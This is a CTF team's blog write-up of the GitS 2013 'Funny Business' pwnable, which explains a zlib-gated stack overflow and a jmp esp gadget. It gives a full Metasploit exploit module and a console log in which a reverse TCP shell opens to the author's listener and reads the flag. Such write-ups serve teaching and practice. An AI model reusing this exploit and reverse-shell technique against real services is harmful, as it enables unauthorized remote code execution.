@@ -1,0 +1,532 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>GitS 2013 - Funny Business - CaptchaFlag CTF Team</title>
+  <meta name="author" content="Captchaflag">
+
+  
+  <meta name="description" content="Challenge Points: 100 Find the key! (File running at funnybusiness.2013.ghostintheshellcode.com) Analysis In order to get the binary to run on 32-bit &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="CaptchaFlag CTF Team" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-37376887-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">CaptchaFlag CTF Team</a></h1>
+  
+    <h2>Blog by the Captchaflag CTF Team</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.captchaflag.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">GitS 2013 - Funny Business</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-17T13:53:00-05:00" pubdate data-updated="true">Feb 17<span>th</span>, 2013</time>
+        
+         | <a href="#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>Challenge</h2>
+
+<p>Points: 100</p>
+
+<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/funnybusiness-fb84813ddd932f6aceee0ed3a4e9f1e0a7082dc1">File</a> running at funnybusiness.2013.ghostintheshellcode.com)</p>
+
+<h2>Analysis</h2>
+
+<p>In order to get the binary to run on 32-bit Linux, you first need to run:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>adduser funnybusiness
+</span><span class='line'><span class="nv">$ </span>sudo su
+</span><span class='line'><span class="nv">$ </span>./funnybiz.elf
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Application is running on port 49681:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>netstat -antp | grep LISTEN | grep funnybiz
+</span><span class='line'>tcp        0      0 0.0.0.0:49681           0.0.0.0:*               LISTEN      17495/funnybiz.elf
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Let&#8217;s look at HexRays decompilation of sub<em>8048C60:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>int __cdecl sub</em>8048D70<span class="o">(</span>int sock<em>fd<span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>  int v1; // ebx@1
+</span><span class='line'>  char v3; // <span class="o">[</span>sp+1Fh<span class="o">]</span> <span class="o">[</span>bp-Dh<span class="o">]</span>@4
+</span><span class='line'>
+</span><span class='line'>  *<span class="o">(</span></em>QWORD *<span class="o">)</span>&amp;strm.zalloc <span class="o">=</span> 0LL;
+</span><span class='line'>  strm.opaque <span class="o">=</span> 0;
+</span><span class='line'>  *<span class="o">(</span><em>QWORD *<span class="o">)</span>&amp;strm.next</em>in <span class="o">=</span> 0LL;
+</span><span class='line'>  <span class="nv">v1</span> <span class="o">=</span> inflateInit<em><span class="o">(</span>&amp;strm, <span class="s2">&quot;1.2.7&quot;</span>, 56<span class="o">)</span>;
+</span><span class='line'>  <span class="k">if</span> <span class="o">(</span> !v1 <span class="o">)</span>
+</span><span class='line'>  <span class="o">{</span>
+</span><span class='line'>    read</em>data<em>from</em>socket<span class="o">(</span>sock<em>fd, &amp;strm.avail</em>in, 4<span class="o">)</span>;
+</span><span class='line'>    <span class="k">if</span> <span class="o">(</span> strm.avail<em>in &lt;<span class="o">=</span> 0x4000 <span class="o">)</span>
+</span><span class='line'>    <span class="o">{</span>
+</span><span class='line'>      read</em>data<em>from</em>socket<span class="o">(</span>sock<em>fd, &amp;v3, strm.avail</em>in<span class="o">)</span>;
+</span><span class='line'>      strm.next<em>in <span class="o">=</span> <span class="o">(</span>Bytef *<span class="o">)</span>&amp;v3;
+</span><span class='line'>      strm.avail</em>out <span class="o">=</span> 16384;
+</span><span class='line'>      strm.next<em>out <span class="o">=</span> <span class="o">(</span>Bytef *<span class="o">)</span>&amp;unk</em>804B0A0;
+</span><span class='line'>      <span class="k">if</span> <span class="o">(</span> inflate<span class="o">(</span>&amp;strm, 4<span class="o">)</span> !<span class="o">=</span> 1 <span class="o">)</span>
+</span><span class='line'>        <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span>;
+</span><span class='line'>      inflateEnd<span class="o">(</span>&amp;strm<span class="o">)</span>;
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>  <span class="k">return </span>v1;
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We first send the size of our zlib data, which must be less than 0x4000. The size we provide is then used for the number of bytes to be read off the wire next.</p>
+
+<p>The second call to read<em>from</em>socket() is copying our data directly to the stack, without any bounds checking. In this case, there isn&#8217;t even a buffer allocated for the data. </p>
+
+<p>The last requirement is that the data supplied must be valid compressed zlib data, otherwise the program will exit before returning from this function. So, we simply send the smallest possible zlib stream and append our payload. The zlib stream will contain a size so we don&#8217;t have to worry about the appended data.</p>
+
+<p>Find simple ROP gadget to redirect execution to the stack (since its executable) to avoid any issues with stack randomization.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@stack0ns-MacBook-Pro:~&gt; ./msfelfscan funnybiz.elf -j esp
+</span><span class='line'><span class="o">[</span>/Users/stacks0n/funnybiz.elf<span class="o">]</span>
+</span><span class='line'>0x08049043 jmp esp
+</span></code></pre></td></tr></table></div></figure>
+
+<p>MSF module as follows:
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">##</span>
+</span><span class='line'><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span>
+</span><span class='line'><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span>
+</span><span class='line'><span class="c1"># web site for more information on licensing and terms of use.</span>
+</span><span class='line'><span class="c1">#   http://metasploit.com/</span>
+</span><span class='line'><span class="c1">##</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+</span><span class='line'>        <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
+</span><span class='line'>                <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;GitS 2013 Pwnable 100 - Funny Business&#39;</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="s1">&#39;stacks0n&#39;</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;License&#39;</span>        <span class="o">=&gt;</span> <span class="no">MSF</em>LICENSE</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span>
+</span><span class='line'>                        <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="n">register_options</span><span class="p">(</span>
+</span><span class='line'>                        <span class="o">[</span>
+</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;54.235.156.9&#39;</span><span class="p">),</span>
+</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">49681</span><span class="p">)</span>
+</span><span class='line'>                        <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">def</span> <span class="nf">exploit</span>
+</span><span class='line'>                <span class="n">connect</span>
+</span><span class='line'>                <span class="c1"># we must send valid zlib data so the code doesn&#39;t exit</span>
+</span><span class='line'>                <span class="c1"># this is zlib deflation of a single &#39;a&#39;</span>
+</span><span class='line'>                <span class="n">zlib</span>    <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x78\x9C\x73\xE4\x02\x00\x00\x8E\x00\x4C</span><span class="s2">&quot;</span>
+</span><span class='line'>                <span class="n">padding</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90\x90\x90</span><span class="s2">&quot;</span>
+</span><span class='line'>                <span class="n">rop</span>     <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x43\x90\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># jmp esp</span>
+</span><span class='line'>                <span class="nb">p</span>       <span class="o">=</span> <span class="n">zlib</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="c1"># send the size of our payload</span>
+</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="o">[</span><span class="nb">p</span><span class="o">.</span><span class="n">size</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">))</span>
+</span><span class='line'>                <span class="c1"># send the payload</span>
+</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="n">handler</span>
+</span><span class='line'>                <span class="n">disconnect</span>
+</span><span class='line'>        <span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf  exploit<span class="o">(</span>funny_business<span class="o">)</span> &gt; show options
+</span><span class='line'>
+</span><span class='line'>Module options <span class="o">(</span>exploit/gits/funny_business<span class="o">)</span>:
+</span><span class='line'>
+</span><span class='line'>   Name   Current Setting  Required  Description
+</span><span class='line'>   ----   ---------------  --------  -----------
+</span><span class='line'>   RHOST  54.235.156.9     yes       The target address
+</span><span class='line'>   RPORT  49681            yes       The target port
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Payload options <span class="o">(</span>linux/x86/shell_reverse_tcp<span class="o">)</span>:
+</span><span class='line'>
+</span><span class='line'>   Name   Current Setting  Required  Description
+</span><span class='line'>   ----   ---------------  --------  -----------
+</span><span class='line'>   LHOST  68.47.237.170     yes       The listen address
+</span><span class='line'>   LPORT  4444             yes       The listen port
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Exploit target:
+</span><span class='line'>
+</span><span class='line'>   Id  Name
+</span><span class='line'>   --  ----
+</span><span class='line'>   0   Automatic
+</span><span class='line'>
+</span><span class='line'>msf  exploit<span class="o">(</span>funny_business<span class="o">)</span> &gt; exploit
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind </span>to 68.47.237.170:4444
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 0.0.0.0:4444
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.30:4444 -&gt; 54.235.156.9:57768<span class="o">)</span> at 2013-02-15 23:54:39 -0500
+</span><span class='line'>
+</span><span class='line'>cat key
+</span><span class='line'>Compressions can be hard at <span class="nb">times</span>
+</span></code></pre></td></tr></table></div></figure>
+
+<h2>Solution</h2>
+
+<p>Compressions can be hard at times</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">stacks0n</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-17T13:53:00-05:00" pubdate data-updated="true">Feb 17<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/pwnable/'>pwnable</a>, <a class='category' href='/blog/categories/rop/'>rop</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business/" data-via="captchaflag" data-counturl="http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/01/07/hack-you-too-keygen-me/" title="Previous Post: Hack You Too - Keygen Me?">&laquo; Hack You Too - Keygen Me?</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/02/17/gits-2013-shiftd/" title="Next Post: GitS 2013 - Shiftd">GitS 2013 - Shiftd &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/">Hack.lu 2014 - Guess the Flag</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/">Hack.lu 2014 - Dalton's Corporate Security Safe for Business</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-douchemac/">Hack.lu 2014 - Douchemac</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-imageupload/">Hack.lu 2014 - ImageUpload</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/23/hack-dot-lu-2014-wiener/">Hack.lu 2014 - wiener</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("captchaflag", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/captchaflag" class="twitter-follow-button" data-show-count="false">Follow @captchaflag</a>
+  
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Captchaflag -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'captchaflag';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business/';
+        var disqus_url = 'http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
